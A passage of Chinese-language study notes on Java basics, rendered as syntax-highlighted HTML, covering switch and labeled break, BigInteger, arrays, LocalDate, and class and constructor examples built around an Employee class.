class="token punctuation">&#123;</span>    <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">default</span><span class="token operator">:</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><strong>有可能触发多个case分支。如果在case分支语句的末尾没有break语句，那么就会接着执行下一个case分支语句。这种情况非常危险，因此最好不要使用switch语句。</strong></p><p>带标签的break语句：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> n <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span><span class="token keyword">int</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>feng<span class="token operator">:</span><span class="token keyword">while</span><span class="token punctuation">(</span>count <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">></span> count<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">break</span> feng<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>虽然代码毫无逻辑，但是至少了解了一下带标签的break。</p><p>标签必须放在希望跳出的最外层循环之外，并且必须紧跟一个冒号。执行带标签的break会跳转到带标签的语句块末尾。这里就是结束这个while循环，所以打印出来的是0。</p><p>大数：</p><p><code>java.math</code>包中两个很有用的类：<code>BigInteger</code>和<code>BigDecimal</code>。这两个类可以处理包含任意长度数字序列的数值。</p><pre class="language-java" data-language="java"><code class="language-java">      <span class="token class-name">BigInteger</span> a <span class="token operator">=</span> <span class="token class-name">BigInteger</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token number">10000000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//对于更大的数，就是用带字符串的构造器</span>      <span class="token class-name">BigInteger</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigInteger</span><span class="token punctuation">(</span><span class="token string">"1000000000000000000000000000000000000"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>此外Java没有提供运算符重载的功能，因此必须用add,multiply,divide,subtract等函数。</p><p><strong>数组</strong></p><p>声明数组：在声明数组变量的时候，需要指出数组类型（数组元素类型紧跟[]）和数组变量的名字。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a<span class="token punctuation">;</span></code></pre><p>使用<strong>new</strong>操作符创建数组：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre><p>一旦创建了数组，就不能再改变它的长度。</p><p>还有一种创建数组对象并同时提供初始值的简写形式：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">&#125;</span> <span class="token comment">//最后一个值后面允许有逗号</span></code></pre><p>还可以声明匿名数组。这种语法可以重新初始化一个数组而无须创建新变量：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>Java中允许有长度为0的数组，创建长度为0的数组：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">new</span> elementType<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">new</span> elementType<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><p>创建一个数字数组时，所有元素都初始化为0。boolean数组的元素会初始化为false。对象数组的元素则初始化为一个特殊值null，表示这些元素还未存放任何对象。</p><p>使用<code>array.length</code>获得数组中元素的个数：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> b<span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>b<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>Java中的for each循环：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">for</span><span class="token punctuation">(</span>variable <span class="token operator">:</span> collection<span class="token punctuation">)</span> statement</code></pre><p>collection这一集合表达式必须是一个数组或者是一个实现了Iterable接口的类对象。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">:</span> a<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>for each循环语句的循环变量将会遍历数组中的每个元素，而不是下标值。</p><p><code>Arrays</code>类的<code>toString</code>方法可以简单的打印一个数组中的所有值：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>数组拷贝：</p><p>将一个数组变量拷贝到另一个数组变量，这时两个变量将引用同一数组：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> b <span class="token operator">=</span> a<span class="token punctuation">;</span>b<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">999</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//999</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>b<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//999</span></code></pre><p>如果希望将一数组中的所有值拷贝到一个新的数组中去，常用Arrays类的copyOf方法：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> b <span class="token operator">=</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">copyOf</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>a<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>b<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">999</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//2</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>b<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//999</span></code></pre><p>copyOf的第二个参数是新数组的大小，正常可以比原数组的长度要大，以增长数组。如果短的话，就只会拷贝前面的值。</p><p><code>Arrays.sort()</code>，使用优化的快速排序算法。</p><p><strong>多维数组</strong></p><p>声明：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">double</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> feng<span class="token punctuation">;</span></code></pre><p>初始化：</p><pre class="language-java" data-language="java"><code class="language-java">feng <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">double</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#123;</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#123;</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><p>for each不能自动处理二维数组中的每一个元素，它是循环行的，因此要使用2层for each。</p><p>快速打印一个二维数组：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">deepToString</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="类与对象"><a href="#类与对象" class="headerlink" title="类与对象"></a>类与对象</h3><p><strong>面向对象程序设计（object-oriented programming,OOP）</strong></p><p>由类构造(construct)对象的过程称为创建类的实例。</p><p>对象中的数据称为实例字段，操作数据的过程称为方法。</p><p>实现封装的关键在于，绝对不能让类中的方法直接访问其他类的实例字段。程序只能通过对象的方法与对象进行交互。</p><p>Java中，所有其他类都拓展自Object类。</p><p>类之间，最常见的关系：</p><ul><li>依赖（uses-a）</li><li>聚合（has-a）</li><li>继承（is-a）</li></ul><p>如果一个类的方法使用或操纵另一个类的对象，我们就说一个类依赖于另一个类。</p><p>Java中使用构造器构造新实例。构造器的名字应该与类名相同。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Date</span> nowTime <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>nowTime<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>对象变量并没有实际包含一个对象，它只是引用一个对象。</p><p>在Java中，任何对象变量的值都是对存储在另一个地方的某个对象的引用。new操作符的返回值也是一个引用。</p><p>在Java中，必须使用clone方法获得对象的完整副本。</p><p>标准Java类库分别包含了两个类：一个是用来表示时间点的Date类，另一个是大家熟悉的日历表示法表示日期的LocalDate类。</p><p>不要使用构造器来构造LocalDate类的对象，应当使用静态工厂方法。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">LocalDate</span> date1 <span class="token operator">=</span> <span class="token class-name">LocalDate</span><span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">LocalDate</span> date2 <span class="token operator">=</span> <span class="token class-name">LocalDate</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token number">2001</span><span class="token punctuation">,</span><span class="token number">01</span><span class="token punctuation">,</span><span class="token number">02</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>date1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//2024-09-01</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>date2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//2001-01-02</span><span class="token keyword">int</span> year <span class="token operator">=</span> date2<span class="token punctuation">.</span><span class="token function">getYear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> month <span class="token operator">=</span> date2<span class="token punctuation">.</span><span class="token function">getMonthValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> day <span class="token operator">=</span> date2<span class="token punctuation">.</span><span class="token function">getDayOfMonth</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>year<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//2001</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>month<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//1</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>day<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//2</span><span class="token class-name">LocalDate</span> date3 <span class="token operator">=</span> date2<span class="token punctuation">.</span><span class="token function">plusDays</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>date3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//2001-01-03</span><span class="token class-name">LocalDate</span> date4 <span class="token operator">=</span> date2<span class="token punctuation">.</span><span class="token function">minusDays</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>date4<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//2001-01-01</span></code></pre><p><strong>更改器方法：</strong>调用这个方法后，对象的状态会改变。</p><p><strong>访问器方法：</strong>只访问对象而不修改对象的方法。</p><p>文件名必须与public类的名字相匹配。在一个源文件中，只能有一个公共类，但可以有任意数目的非公共类。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Employee_test</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Employee</span><span class="token punctuation">[</span><span class="token punctuation">]</span> staff <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        staff<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"Carl Cracker"</span><span class="token punctuation">,</span> <span class="token number">75000</span><span class="token punctuation">,</span> <span class="token number">1987</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        staff<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"Harry Hacker"</span><span class="token punctuation">,</span> <span class="token number">50000</span><span class="token punctuation">,</span> <span class="token number">1989</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        staff<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"Tony Tester"</span><span class="token punctuation">,</span> <span class="token number">40000</span><span class="token punctuation">,</span> <span class="token number">1990</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Employee</span> e <span class="token operator">:</span> staff<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">raiseSalary</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Employee</span> e <span class="token operator">:</span> staff<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"name="</span> <span class="token operator">+</span> e<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">",salary="</span> <span class="token operator">+</span> e<span class="token punctuation">.</span><span class="token function">getSalary</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">",hireDay="</span> <span class="token operator">+</span> e<span class="token punctuation">.</span><span class="token function">getHireDay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>time<span class="token punctuation">.</span></span><span class="token class-name">LocalDate</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Employee</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">double</span> salary<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">LocalDate</span> hireDay<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">double</span> salary<span class="token punctuation">,</span> <span class="token keyword">int</span> year<span class="token punctuation">,</span> <span class="token keyword">int</span> month<span class="token punctuation">,</span> <span class="token keyword">int</span> day<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>salary <span class="token operator">=</span> salary<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>hireDay <span class="token operator">=</span> <span class="token class-name">LocalDate</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span>year<span class="token punctuation">,</span> month<span class="token punctuation">,</span> day<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">double</span> <span class="token function">getSalary</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>salary<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">LocalDate</span> <span class="token function">getHireDay</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>hireDay<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">raiseSalary</span><span class="token punctuation">(</span><span class="token keyword">double</span> byPercent<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">double</span> raise <span class="token operator">=</span> salary<span class="token operator">*</span>byPercent<span class="token operator">/</span><span class="token number">100</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>salary <span class="token operator">+=</span> raise<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><strong>构造器</strong></p><p>构造器与类同名。在构造Employee类的对象时，构造器会运行，从而将实例字段初始化为所希望的初始状态。</p><p>构造器总是结合new运算符来调用。不能对一个已经存在的对象调用构造器来达到重新设置实例字段目的。</p><p>不要在构造器中定义与实例字段同名的局部变量。</p><p><strong>从Java10开始，对于局部变量，如果可以从变量的初始值推断出它的类型，就不再需要声明类型，只需要使用关键字var而无需指定类型</strong></p><p>注意var关键字只能用于方法中的局部变量。参数和字段的类型必须声明。</p><p>如果对null值应用一个方法，会产生一个<code>NullPointerException</code>异常。</p><p><strong>隐式参数和显式参数</strong></p><p><code>raiseSalary</code>方法有2个参数，第一个参数称为隐式参数，是出现在方法名前的Employee类型的对象。第二个参数是位于方法名后面括号中的数值，这事一个显式参数。</p><p>在每一个方法中，关键字<code>this</code>指示隐式参数。</p><p><strong>注意不要编写返回可变对象引用的访问器方法</strong></p><p>如果需要返回一个可变对象的引用，首先应该对它进行克隆。对象克隆是指存放在另一个新位置上的对象副本。</p><p><strong>一个方法可以访问所属类的所有对象的私有数据</strong></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getOtherName</span><span class="token punctuation">(</span><span class="token class-name">Employee</span> other<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> other<span class="token punctuation">.</span>name<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    <span class="token class-name">Employee</span> other <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"fengfeng"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">,</span><span class="token number">2001</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>staff<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">getOtherName</span><span class="token punctuation">(</span>other<span class="token punctuation">)</span><span class="token 